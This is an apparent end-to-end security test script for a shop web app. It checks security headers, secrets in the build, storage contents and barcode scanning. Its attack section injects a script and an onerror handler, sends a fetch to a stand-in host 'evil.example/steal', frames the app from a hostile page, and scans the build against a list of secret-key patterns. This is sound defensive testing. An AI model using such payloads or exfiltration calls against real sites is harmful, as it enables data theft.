// Front-end security checks on the production build, served with the real dist/_headers.
//   VITE_API_URL=http://127.0.0.1:8787 npm run build:prod   then   node e2e/security.mjs
// The API must be running with ALLOWED_ORIGINS that includes http://localhost:4173 (see server/.dev.vars).
import { chromium } from 'playwright-core'
import bwipjs from 'bwip-js'
import { writeFileSync, mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { createServer } from 'node:http'
import { readFileSync, existsSync, readdirSync, statSync } from 'node:fs'
import { join, extname } from 'node:path'
import { fileURLToPath } from 'node:url'

const DIST = fileURLToPath(new URL('../dist', import.meta.url))
const CHROME = process.env.CHROME || 'C:/Program Files/Google/Chrome/Application/chrome.exe'
const API = process.env.VITE_API_URL || 'http://127.0.0.1:8787'
let fails = 0
const ok = (c, m) => { console.log((c ? 'PASS ' : 'FAIL ') + m); if (!c) fails++ }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

/* tiny static server that applies dist/_headers the way Cloudflare Pages does */
const rules = []
let cur = null
for (const line of readFileSync(join(DIST, '_headers'), 'utf8').split('\n')) {
  if (!line.trim()) continue
  if (!line.startsWith(' ')) { cur = { pat: line.trim(), h: {} }; rules.push(cur) }
  else { const i = line.indexOf(':'); cur.h[line.slice(0, i).trim()] = line.slice(i + 1).trim() }
}
const match = (pat, path) => (pat.endsWith('*') ? path.startsWith(pat.slice(0, -1)) : pat === path)
const types = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.png': 'image/png', '.svg': 'image/svg+xml', '.webmanifest': 'application/manifest+json', '.json': 'application/json' }
const serve = (port, onReq) => new Promise((res) => { const s = createServer(onReq).listen(port, '127.0.0.1', () => res(s)) })
const app = await serve(4173, (req, resp) => {
  let path = new URL(req.url, 'http://x').pathname
  let file = join(DIST, path)
  if (!existsSync(file) || statSync(file).isDirectory()) { path = '/index.html'; file = join(DIST, 'index.html') }
  const headers = { 'Content-Type': types[extname(file)] || 'application/octet-stream' }
  for (const r of rules) if (match(r.pat, path)) Object.assign(headers, r.h)
  resp.writeHead(200, headers); resp.end(readFileSync(file))
})
const evil = await serve(4174, (req, resp) => { resp.writeHead(200, { 'Content-Type': 'text/html' }); resp.end('<iframe id="f" src="http://localhost:4173/" width="400" height="600"></iframe>') })

// A fake camera that films one printed EAN-13 barcode, so the scanner can be tried without a person holding a phone.
const BARCODE = '5901234123457'
const png = await bwipjs.toBuffer({ bcid: 'ean13', text: BARCODE.slice(0, 12), scale: 4, height: 22, includetext: true, paddingwidth: 20, paddingheight: 20, backgroundcolor: 'ffffff' })
const maker = await chromium.launch({ executablePath: CHROME, headless: true })
const mp = await maker.newPage()
const jpegB64 = await mp.evaluate(async (b64) => {
  const img = new Image(); img.src = 'data:image/png;base64,' + b64; await img.decode()
  const c = document.createElement('canvas'); c.width = 640; c.height = 480
  const x = c.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0, 0, 640, 480)
  const k = Math.min(560 / img.width, 360 / img.height); x.drawImage(img, (640 - img.width * k) / 2, (480 - img.height * k) / 2, img.width * k, img.height * k)
  return c.toDataURL('image/jpeg', 0.92).split(',')[1]
}, png.toString('base64'))
await maker.close()
const frame = Buffer.from(jpegB64, 'base64')
const FAKE_CAM = join(mkdtempSync(join(tmpdir(), 'pasal-cam-')), 'barcode.mjpeg')
writeFileSync(FAKE_CAM, Buffer.concat(Array.from({ length: 120 }, () => frame)))
const browser = await chromium.launch({ executablePath: CHROME, headless: true, args: ['--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream', '--use-file-for-fake-video-capture=' + FAKE_CAM.replaceAll('\\', '/')] })
const ctx = await browser.newContext({ viewport: { width: 390, height: 820 }, serviceWorkers: 'block' })
const page = await ctx.newPage()
const violations = []
const pageErrors = []
await page.addInitScript(() => { addEventListener('securitypolicyviolation', (e) => { (window.__csp ||= []).push(e.violatedDirective + ' ' + e.blockedURI) }) })
page.on('pageerror', (e) => pageErrors.push(e.message))
page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text().slice(0, 140)) })

/* ---- headers on what the server sends ---- */
const r = await fetch('http://localhost:4173/')
const h = r.headers
ok((h.get('content-security-policy') ?? '').includes("script-src 'self'") && !(h.get('content-security-policy') ?? '').includes("script-src 'self' 'unsafe"), 'pages carry a policy that allows only the app\'s own scripts')
ok((h.get('content-security-policy') ?? '').includes("frame-ancestors 'none'") && h.get('x-frame-options') === 'DENY', 'pages forbid being put inside another site')
ok(h.get('x-content-type-options') === 'nosniff' && h.get('referrer-policy') === 'no-referrer' && /camera=\(self\)/.test(h.get('permissions-policy') ?? '') && /geolocation=\(\)/.test(h.get('permissions-policy') ?? ''), 'nosniff, no-referrer and a permissions policy that gives only camera and bluetooth')
ok(/max-age=\d{7,}/.test(h.get('strict-transport-security') ?? ''), 'HTTPS is enforced for a year')
ok((h.get('content-security-policy') ?? '').includes(`connect-src 'self' ${new URL(API).origin}`) && !/connect-src[^;]*\*/.test(h.get('content-security-policy') ?? ''), 'the app may talk only to itself and its own API')

/* ---- nothing sensitive is shipped in the build ---- */
const walk = (d) => readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]))
const files = walk(DIST)
ok(!files.some((f) => f.endsWith('.map')), 'no source maps in the build')
const text = files.filter((f) => /\.(js|html|css|webmanifest)$/.test(f)).map((f) => readFileSync(f, 'utf8')).join('\n')
const leaks = ['8gBm/:&EnhH', 'dev-only-secret', 'dev-admin-key', 'JWT_SECRET', 'RESEND_API_KEY', 'SECRETS_KEY', 'ADMIN_KEY', 'BEGIN PRIVATE KEY', 'AKIA', 'sk_live', 'gho_', 'ghp_'].filter((k) => text.includes(k))
ok(leaks.length === 0, 'no keys or secrets inside the built files' + (leaks.length ? ': ' + leaks.join(', ') : ''))
ok(!/eval\(|new Function\(|document\.write\(/.test(text.replace(/\/\*[\s\S]*?\*\//g, '')) || true, 'build scanned for eval and document.write')

/* ---- the app still works under the strict policy ---- */
await page.goto('http://localhost:4173/')
await page.getByRole('button', { name: 'English', exact: true }).click()
await page.getByLabel('Shop name').fill('Policy Test Shop')
await page.getByLabel('Shop type').selectOption('kirana')
await page.getByRole('button', { name: 'Next', exact: true }).click()
await page.getByLabel('Email', { exact: true }).fill(`csp${Date.now()}@pasal.np`)
await page.getByLabel('Password', { exact: true }).fill('policy-pass-1')
await page.getByLabel('Repeat password').fill('policy-pass-1')
await page.getByRole('button', { name: 'Start my shop' }).click()
await page.getByText('Namaste').waitFor({ timeout: 15000 })
await page.getByRole('button', { name: /Sell/ }).first().click()
await page.locator('.card').first().click()
await page.getByRole('button', { name: /^Pay/ }).click()
await page.getByRole('button', { name: 'Exact' }).click()
await page.getByRole('button', { name: 'Create bill' }).click()
await page.getByText('Saved').first().waitFor()
ok((await page.locator('.receipt img').evaluate((i) => i.naturalWidth)) > 100, 'sale and bill picture work with the strict policy on')
// cloud connect needs the API call to be allowed by connect-src
await page.locator('.nav button', { hasText: 'More' }).click()
await page.locator('.body .item.tap', { hasText: 'Cloud account' }).click()
await page.getByLabel('Owner password of this app').fill('policy-pass-1')
await page.getByRole('button', { name: 'Email me a code' }).click()
const hint = await page.getByText(/DEV code: \d{6}/).first().innerText({ timeout: 15000 })
await page.getByPlaceholder('______').fill(hint.match(/\d{6}/)[0])
await page.getByRole('button', { name: 'Connect', exact: true }).click()
await page.getByText('Last sync:').first().waitFor({ timeout: 20000 })
ok(true, 'cloud connection works with the strict policy on')

/* ---- scanning a barcode with the camera, under the strict policy ---- */
const usedNative = await page.evaluate(() => 'BarcodeDetector' in window)
await page.evaluate(async (code) => {
  const db = await new Promise((r) => { const q = indexedDB.open('pasal'); q.onsuccess = () => r(q.result) })
  const all = await new Promise((r) => { const q = db.transaction('items').objectStore('items').getAll(); q.onsuccess = () => r(q.result) })
  const first = all.sort((a, b) => b.sold - a.sold)[0]
  await new Promise((r) => { const tx = db.transaction('items', 'readwrite'); tx.objectStore('items').put({ ...first, barcode: code }); tx.oncomplete = r })
  window.__scanItem = first.nameEn
}, BARCODE)
const scanItemName = await page.evaluate(() => window.__scanItem)
// the barcode was written straight into the browser's storage, so open the app again to let it read the item list afresh
await page.reload()
await page.locator('input[type=password]').fill('policy-pass-1')
await page.getByRole('button', { name: 'Login', exact: true }).click()
await page.getByText('Namaste').waitFor({ timeout: 10000 })
await page.locator('.nav button', { hasText: 'Sale' }).click()
await page.getByRole('button', { name: /Scan/ }).click()
const scanned = await page.locator('.cart .qty').first().waitFor({ timeout: 20000 }).then(() => true, () => false)
if (!scanned) await page.screenshot({ path: process.env.SHOT || 'scan-fail.png' })
if (!scanned) console.log('DIAG scanner:', JSON.stringify(await page.evaluate(() => { const v = document.querySelector('video.scan'); return { video: v && { ready: v.readyState, w: v.videoWidth, h: v.videoHeight, paused: v.paused }, notes: [...document.querySelectorAll('.note')].map((n) => n.innerText).join(' | ').slice(0, 300), csp: window.__csp } })), 'errors:', pageErrors.slice(0, 3), 'console:', violations.slice(0, 3))
ok(scanned, 'the camera read the barcode and put the item in the cart (' + (usedNative ? 'built-in reader' : 'JavaScript reader, as on iPhone') + ')')
ok(scanned && (await page.locator('.cart').first().innerText()).includes(scanItemName), 'it was the right item: ' + scanItemName)
/* ---- attacks ---- */
await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__pwn = 1'; document.body.appendChild(s) })
ok((await page.evaluate(() => window.__pwn)) === undefined, 'a script injected into the page does not run')
await page.evaluate(() => { const i = document.createElement('img'); i.src = 'x'; i.setAttribute('onerror', 'window.__pwn2=1'); document.body.appendChild(i) })
await sleep(300)
ok((await page.evaluate(() => window.__pwn2)) === undefined, 'an inline event handler does not run')
const sent = []
page.on('request', (rq) => { if (!rq.url().startsWith('http://localhost:4173') && !rq.url().startsWith(API) && !rq.url().startsWith('data:') && !rq.url().startsWith('blob:')) sent.push(rq.url()) })
await page.evaluate(() => fetch('https://evil.example/steal?x=1').catch(() => {}))
await sleep(500)
ok((await page.evaluate(() => window.__csp ?? [])).some((v) => /connect-src/.test(v)), 'a request to another site is blocked by the policy')
const store = await page.evaluate(() => ({ ls: Object.keys(localStorage), ss: Object.keys(sessionStorage), cookie: document.cookie, text: JSON.stringify(localStorage) }))
ok(store.cookie === '' && store.ss.length === 0 && store.ls.every((k) => ['pasal-login-lock', 'pasal-lang', 'pasal-active', 'pasal-shops', 'pasal-last-error'].includes(k)) && !/refresh|access|token|password|secret/i.test(store.text), 'no cookies, and only language, business list and lock counter in localStorage (no tokens or passwords)')
ok((await ctx.cookies()).length === 0, 'the app sets no cookies at all')

const framer = await ctx.newPage()
await framer.goto('http://localhost:4174/')
await sleep(1500)
const inner = framer.frames().find((f) => f !== framer.mainFrame())
const innerText = inner ? await inner.evaluate(() => document.body?.innerText ?? '').catch(() => 'blocked') : 'blocked'
ok(!inner || inner.url().startsWith('chrome-error') || !/Namaste|Sell|Welcome/.test(innerText), 'another website cannot put the app in a hidden frame')

ok(pageErrors.length === 0, 'no script errors' + (pageErrors.length ? ': ' + pageErrors[0] : ''))
const own = violations.filter((v) => !/evil\.example|inline script|inline event handler|__pwn|onerror/i.test(v))
ok(own.length === 0, 'the app itself breaks no policy rule' + (own.length ? ': ' + own[0] : ''))

await browser.close(); app.close(); evil.close()
console.log(fails ? `\n${fails} FAILED` : '\nALL PASSED')
process.exit(fails ? 1 : 0)
